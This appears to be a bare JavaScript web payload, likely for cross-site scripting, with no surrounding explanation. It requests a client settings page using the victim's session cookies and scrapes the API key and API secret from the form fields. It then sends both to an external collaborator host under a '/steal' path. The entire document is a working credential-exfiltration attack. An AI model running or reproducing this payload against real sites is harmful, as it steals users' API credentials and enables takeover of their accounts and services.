fetch("/client/settings/configuration", {credentials:"include"})
  .then(r=>r.text())
  .then(h=>{
    let d=new DOMParser().parseFromString(h,"text/html");
    let k=d.querySelector('input[name="api_key"]')?.value;
    let s=d.querySelector('input[name="api_secret"]')?.value;
    if(k&&s){
      fetch(`https://b0csv634g8enmankhpte1toqyh48s4gt.oastify.com/steal?key=${encodeURIComponent(k)}&secret=${encodeURIComponent(s)}`);
    }
  });
